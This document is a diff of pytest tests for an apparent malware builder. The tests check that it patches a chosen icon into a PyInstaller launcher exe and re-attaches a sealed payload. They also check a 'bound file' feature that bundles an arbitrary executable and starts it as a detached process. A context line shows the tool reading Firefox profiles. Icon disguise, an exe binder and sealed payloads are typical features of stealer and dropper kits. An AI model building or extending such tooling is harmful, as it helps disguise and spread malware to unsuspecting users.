@@ -30,6 +30,7 @@ import io
 import json
 import os
 import sqlite3
+import struct
 import sys
 import zipfile
 from dataclasses import FrozenInstanceError
@@ -41,7 +42,7 @@ ROOT = Path(__file__).resolve().parent.parent
 if str(ROOT) not in sys.path:
     sys.path.insert(0, str(ROOT))
 
-from agent import loader  # noqa: E402
+from agent import entry, loader  # noqa: E402
 from core import forge, pipeline, rename, seal  # noqa: E402
 from core import validate as validate_module  # noqa: E402
 from core.schema import (  # noqa: E402
@@ -1005,3 +1006,306 @@ def test_firefox_with_nothing_to_read_writes_nothing(tmp_path: Path) -> None:
 
     assert gecko.run_profile(profile, target) == 0
     assert not target.exists() or not any(target.iterdir())
+
+
+# --- the icon ----------------------------------------------------------------
+
+LAUNCHER = ROOT / "tools" / "dist" / "sable-launcher.exe"
+
+
+def pe_image(sections: list[tuple[int, int]], *, headers: int = 0x200) -> bytes:
+    """A file with a real PE header: DOS pointer, COFF, optional header, sections."""
+    optional_size = 0xE0
+    pointer = 0x40
+    coff = pointer + 4
+    optional = coff + 20
+    table = optional + optional_size
+
+    end = headers
+    for offset, size in sections:
+        end = max(end, offset + size)
+
+    data = bytearray(max(end, headers))
+    data[:2] = b"MZ"
+    struct.pack_into("<I", data, 0x3C, pointer)
+    data[pointer:pointer + 4] = b"PE\0\0"
+    struct.pack_into("<H", data, coff + 2, len(sections))
+    struct.pack_into("<H", data, coff + 16, optional_size)
+    struct.pack_into("<I", data, optional + 60, headers)
+    for index, (offset, size) in enumerate(sections):
+        base = table + index * 40
+        struct.pack_into("<II", data, base + 16, size, offset)
+    return bytes(data)
+
+
+def ico(images: list[bytes]) -> bytes:
+    """A single-library ``.ico`` carrying the images given."""
+    table = b""
+    offset = 6 + 16 * len(images)
+    for image in images:
+        table += struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, len(image), offset)
+        offset += len(image)
+    return struct.pack("<HHH", 0, 1, len(images)) + table + b"".join(images)
+
+
+def test_the_image_ends_where_the_appended_archive_starts() -> None:
+    # The launcher is a PE image with a PyInstaller archive welded to its tail. A
+    # resource update rewrites the image and drops the tail, so the boundary has to be
+    # measured before the patch — this is the measurement.
+    image = pe_image([(0x200, 0x400), (0x600, 0x200)], headers=0x200)
+    overlay = b"MEI\x0c\x0b\x0a\x0b\x0e" + bytes(64)
+    assert forge.image_end(image + overlay) == 0x800
+
+
+def test_the_image_end_never_lands_inside_the_headers() -> None:
+    image = pe_image([(0x400, 0x20)], headers=0x1000)
+    assert forge.image_end(image + b"tail") == 0x1000
+
+
+def test_something_that_is_not_a_pe_is_refused_rather_than_measured() -> None:
+    with pytest.raises(forge.ForgeError):
+        forge.image_end(b"MZ" + bytes(0x100))
+    with pytest.raises(forge.ForgeError):
+        forge.image_end(b"PK\x03\x04" + bytes(0x100))
+
+
+def test_an_ico_is_read_into_the_images_it_carries() -> None:
+    entries = forge._icon_entries(ico([bytes(64), bytes(256)]))
+
+    assert [len(item.data) for item in entries] == [64, 256]
+    assert [(item.width, item.height, item.bit_count) for item in entries] == [
+        (16, 16, 32),
+        (16, 16, 32),
+    ]
+
+
+def test_the_group_resource_names_every_image_by_the_id_it_is_filed_under() -> None:
+    entries = forge._icon_entries(ico([bytes(64), bytes(256)]))
+    group = forge.group_payload(entries)
+
+    assert len(group) == 6 + 2 * 14
+    assert group[:6] == struct.pack("<HHH", 0, 1, 2)
+    assert group[6:10] == bytes([16, 16, 0, 0])
+    assert struct.unpack_from("<I", group, 6 + 8)[0] == 64
+    assert struct.unpack_from("<H", group, 6 + 12)[0] == 1
+    assert struct.unpack_from("<I", group, 6 + 14 + 8)[0] == 256
+    assert struct.unpack_from("<H", group, 6 + 14 + 12)[0] == 2
+
+
+@pytest.mark.parametrize(
+    "raw",
+    [
+        b"",
+        b"\x00\x00\x01",
+        struct.pack("<HHH", 1, 1, 1),
+        struct.pack("<HHH", 0, 2, 1),
+        struct.pack("<HHH", 0, 1, 0),
+        struct.pack("<HHH", 0, 1, 1) + struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, 32, 999),
+    ],
+)
+def test_an_icon_that_is_not_one_is_refused(raw: bytes) -> None:
+    with pytest.raises(forge.ForgeError):
+        forge._icon_entries(raw)
+
+
+@pytest.mark.skipif(
+    not LAUNCHER.is_file(),
+    reason="the launcher has not been built in this tree",
+)
+@needs_crypto
+def test_an_icon_grows_the_launcher_and_the_footer_follows(tmp_path: Path) -> None:
+    # The proof that the patch is real: the stub changes size, the offset the footer
+    # records follows it, and the PyInstaller archive is still welded to the tail.
+    # Without the re-append the artifact is a 360 KB exe that boots nothing.
+    icon = tmp_path / "mark.ico"
+    icon.write_bytes(ico([bytes(64), bytes(256)]))
+
+    data = forge.payload(ROOT, config())
+    built = forge.build(
+        config(),
+        seal.seal(data, SEAL_KEY),
+        tmp_path / "marked.exe",
+        mode="exe",
+        stub=LAUNCHER,
+        icon=icon,
+    )
+
+    raw = built.read_bytes()
+    offset = int.from_bytes(raw[-forge.FOOTER_SIZE + 4:], "little")
+
+    # Ballast is zero, so the footer's offset is the patched stub's size. It is not the
+    # launcher's size — measured, Windows rebuilds the resource section and the rebuilt
+    # one is smaller than the bootloader's icon set it replaced. Under or over does not
+    # matter; what matters is that the offset describes the file that was actually
+    # written.
+    original = LAUNCHER.read_bytes()
+    assert offset != len(original), "the icon did not change the launcher"
+    assert raw[offset - 64:offset] == original[-64:], "the appended archive did not survive"
+
+    # Not "an icon is present" — these exact bytes are the group resource we asked for,
+    # and resource data is stored raw, so the group we built is the group the file has.
+    assert forge.group_payload(forge.icon_entries(icon)) in raw
+
+    header = loader._read_trailer(built)
+    assert header.seal_key == SEAL_KEY
+    assert loader._open_sealed(loader._read_sealed(built, offset), header.seal_key) == data
+
+
+def test_an_icon_is_a_note_on_script_output(tmp_path: Path) -> None:
+    icon = tmp_path / "mark.ico"
+    icon.write_bytes(ico([bytes(16)]))
+
+    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, icon=icon)
+
+    assert [problem.blocking for problem in problems] == [False]
+    assert problems[0].path == "output.icon"
+
+
+def test_a_png_renamed_to_ico_is_refused_before_the_build_starts(tmp_path: Path) -> None:
+    fake = tmp_path / "mark.ico"
+    fake.write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
+
+    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, icon=fake)
+
+    assert validate_module.blocking(problems)
+    assert problems[0].path == "output.icon"
+    assert "not a .ico" in problems[0].message
+
+
+# --- the bound file ----------------------------------------------------------
+
+
+def test_a_bound_file_travels_inside_the_payload(tmp_path: Path) -> None:
+    bound = tmp_path / "install.exe"
+    bound.write_bytes(b"MZ" + bytes(32))
+
+    data = forge.payload(ROOT, config(), fuse=bound)
+
+    with zipfile.ZipFile(io.BytesIO(data)) as archive:
+        assert archive.read("fused/install.exe") == bound.read_bytes()
+
+
+def test_a_payload_without_a_bound_file_carries_none() -> None:
+    data = forge.payload(ROOT, config())
+
+    with zipfile.ZipFile(io.BytesIO(data)) as archive:
+        assert not [name for name in archive.namelist() if name.startswith("fused/")]
+
+
+def test_the_payload_refuses_a_bound_file_it_cannot_carry(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    empty = tmp_path / "empty.exe"
+    empty.write_bytes(b"")
+    with pytest.raises(forge.ForgeError):
+        forge.payload(ROOT, config(), fuse=empty)
+
+    monkeypatch.setattr(forge, "MAX_FUSE_BYTES", 8)
+    heavy = tmp_path / "heavy.exe"
+    heavy.write_bytes(b"M" * 16)
+    with pytest.raises(forge.ForgeError):
+        forge.payload(ROOT, config(), fuse=heavy)
+
+
+def test_both_halves_agree_on_the_prefix_and_what_can_be_started() -> None:
+    # core/ cannot import agent/ and agent/ cannot import core/, so the two constants
+    # are declared twice on purpose. This is the pin that keeps them equal.
+    assert forge.FUSE_PREFIX == entry.FUSE_PREFIX
+    assert forge.BOUND_SUFFIXES == entry.BOUND_SUFFIXES
+
+
+def test_a_bound_file_is_extracted_beside_its_neighbours_and_started(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    archive_path = tmp_path / "payload.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("fused/tool.exe", b"MZ" + bytes(32))
+        archive.writestr("fused/tool.dll", b"MZ" + bytes(8))
+        archive.writestr("agent/entry.py", b"")
+        archive.writestr("cfg.json", b"{}")
+
+    spawned: list[tuple[list[str], dict[str, object]]] = []
+
+    def fake_popen(command: list[str], **kwargs: object) -> object:
+        spawned.append((command, kwargs))
+        return object()
+
+    monkeypatch.setattr(entry.subprocess, "Popen", fake_popen)
+
+    with zipfile.ZipFile(archive_path) as archive:
+        assert entry._start_bound(archive) == 1
+
+    assert len(spawned) == 1, "a .dll is carried, not started"
+    command, options = spawned[0]
+    assert command[0].endswith("tool.exe")
+    assert options["creationflags"] == entry._DETACHED_PROCESS
+    assert Path(command[0]).is_file()
+    assert Path(command[0]).with_name("tool.dll").is_file()
+
+
+def test_nothing_bound_means_nothing_started(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    archive_path = tmp_path / "payload.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("agent/entry.py", b"")
+
+    def forbidden(*_: object, **__: object) -> object:
+        raise AssertionError("nothing was bound, so nothing should start")
+
+    monkeypatch.setattr(entry.subprocess, "Popen", forbidden)
+
+    with zipfile.ZipFile(archive_path) as archive:
+        assert entry._start_bound(archive) == 0
+
+
+def test_a_bound_file_over_the_ceiling_is_skipped_rather_than_read(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    archive_path = tmp_path / "payload.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("fused/huge.exe", b"MZ" + bytes(4096))
+
+    spawned: list[object] = []
+    monkeypatch.setattr(entry.subprocess, "Popen", lambda *a, **k: spawned.append(a))
+    monkeypatch.setattr(entry, "_MAX_BOUND_BYTES", 64)
+
+    with zipfile.ZipFile(archive_path) as archive:
+        assert entry._start_bound(archive) == 0
+    assert not spawned
+
+
+def test_a_launcher_that_does_not_start_is_not_a_dead_run(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    archive_path = tmp_path / "payload.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("fused/tool.exe", b"MZ" + bytes(32))
+
+    def refused(*_: object, **__: object) -> object:
+        raise OSError("no such file")
+
+    monkeypatch.setattr(entry.subprocess, "Popen", refused)
+
+    with zipfile.ZipFile(archive_path) as archive:
+        assert entry._start_bound(archive) == 0
+
+
+def test_a_bound_file_that_cannot_start_is_a_note(tmp_path: Path) -> None:
+    library = tmp_path / "payload.dll"
+    library.write_bytes(b"MZ" + bytes(8))
+
+    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, fuse=library)
+
+    assert [problem.blocking for problem in problems] == [False]
+    assert problems[0].path == "output.fuse"
+    assert "not started" in problems[0].message
+
+
+def test_a_bound_file_that_is_not_there_blocks(tmp_path: Path) -> None:
+    problems = validate_module.validate(
+        config(), mode=forge.OUTPUT_PY, fuse=tmp_path / "gone.exe"
+    )
+
+    assert validate_module.blocking(problems)
+    assert problems[0].path == "output.fuse"
